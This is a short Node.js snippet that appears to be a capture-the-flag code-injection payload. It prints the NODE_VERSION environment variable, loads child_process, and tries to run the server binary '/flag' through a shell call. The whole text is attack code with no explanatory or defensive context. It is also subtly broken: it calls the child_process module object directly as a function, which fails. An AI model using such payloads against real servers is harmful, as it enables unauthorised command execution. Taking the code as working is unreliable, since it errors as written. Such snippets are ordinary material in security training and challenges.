console.log( "[" + process.env.NODE_VERSION + "]");
exec = require("child_process");
exec('/flag', (error, stdout, stderr) => {console.log(stdout)} );
